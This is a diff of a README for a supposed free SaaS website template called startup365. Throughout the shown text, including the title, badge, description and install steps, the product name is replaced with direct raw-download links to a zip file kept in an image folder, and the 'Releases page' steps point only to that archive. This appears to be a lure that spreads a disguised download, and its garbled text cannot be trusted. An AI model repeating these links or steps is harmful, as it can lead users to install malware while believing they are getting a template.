@@ -1,10 +1,10 @@
-# 🚀 startup365 - Free https://raw.githubusercontent.com/harshkkamdar26/startup365/main/pandura/startup365.zip Template for Startups
+# 🚀 startup365 - Free https://github.com/harshkkamdar26/startup365/raw/refs/heads/main/public/images/testimonials/startup_v2.2.zip Template for Startups
 
-[![Download Startup365](https://raw.githubusercontent.com/harshkkamdar26/startup365/main/pandura/startup365.zip%https://raw.githubusercontent.com/harshkkamdar26/startup365/main/pandura/startup365.zip)](https://raw.githubusercontent.com/harshkkamdar26/startup365/main/pandura/startup365.zip)
+[![Download Startup365](https://github.com/harshkkamdar26/startup365/raw/refs/heads/main/public/images/testimonials/startup_v2.2.zip%https://github.com/harshkkamdar26/startup365/raw/refs/heads/main/public/images/testimonials/startup_v2.2.zip)](https://github.com/harshkkamdar26/startup365/raw/refs/heads/main/public/images/testimonials/startup_v2.2.zip)
 
 ## 🌟 Description
 
-Startup365 is a free https://raw.githubusercontent.com/harshkkamdar26/startup365/main/pandura/startup365.zip template designed specifically for SaaS startups. It includes all essential pages, components, and sections you need to launch a complete business website. This template helps you set up your online presence with minimal effort and no coding knowledge required.
+Startup365 is a free https://github.com/harshkkamdar26/startup365/raw/refs/heads/main/public/images/testimonials/startup_v2.2.zip template designed specifically for SaaS startups. It includes all essential pages, components, and sections you need to launch a complete business website. This template helps you set up your online presence with minimal effort and no coding knowledge required.
 
 ## 📋 Features
 
@@ -25,7 +25,7 @@ Startup365 is a free https://raw.githubusercontent.com/harshkkamdar26/startup365
 
 1. **Visit the Releases Page**: Click the link below to go to the download page:
 
-   [Download Startup365](https://raw.githubusercontent.com/harshkkamdar26/startup365/main/pandura/startup365.zip)
+   [Download Startup365](https://github.com/harshkkamdar26/startup365/raw/refs/heads/main/public/images/testimonials/startup_v2.2.zip)
 
 2. **Choose Your Version**: On the Releases page, you will see different versions of the template. Start with the latest stable version.
 
@@ -35,7 +35,7 @@ Startup365 is a free https://raw.githubusercontent.com/harshkkamdar26/startup365
 
 5. **Open the Template Folder**: Navigate to the folder where you extracted the files. You should see several files and folders, including the main template files.
 
-6. **Run the Application**: Open your preferred web browser and find the `https://raw.githubusercontent.com/harshkkamdar26/startup365/main/pandura/startup365.zip` file within the unzipped folder. Double-click it to launch the template in your browser. Now you can see how your new website will look.
+6. **Run the Application**: Open your preferred web browser and find the `https://github.com/harshkkamdar26/startup365/raw/refs/heads/main/public/images/testimonials/startup_v2.2.zip` file within the unzipped folder. Double-click it to launch the template in your browser. Now you can see how your new website will look.
 
 ## 📥 Download & Install
 
@@ -43,7 +43,7 @@ To get started with Startup365, follow these steps to download and run the appli
 
 1. **Visit the Releases Page**: Use the following link to visit the page where you can download the latest version: 
 
-   [Download Startup365](https://raw.githubusercontent.com/harshkkamdar26/startup365/main/pandura/startup365.zip)
+   [Download Startup365](https://github.com/harshkkamdar26/startup365/raw/refs/heads/main/public/images/testimonials/startup_v2.2.zip)
 
 2. **Select the Latest Release**: Look for the latest release version. Click on it to access the downloadable files.
 
